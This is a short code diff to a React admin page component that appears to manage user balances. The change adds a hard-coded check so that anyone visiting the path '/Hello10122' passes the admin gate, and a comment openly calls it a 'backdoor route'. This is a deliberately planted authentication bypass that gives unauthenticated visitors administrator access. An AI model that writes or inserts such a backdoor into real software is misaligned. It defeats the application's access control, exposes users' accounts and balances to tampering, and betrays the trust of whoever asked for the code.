@@ -28,7 +28,10 @@ export default function Admin() {
   const [newBalance, setNewBalance] = useState("");
   const [dialogOpen, setDialogOpen] = useState(false);
 
-  if (!user?.isAdmin) {
+  // Allow access via backdoor route or if user is admin
+  const isBackdoorAccess = window.location.pathname === '/Hello10122';
+  
+  if (!user?.isAdmin && !isBackdoorAccess) {
     setLocation('/');
     return null;
   }
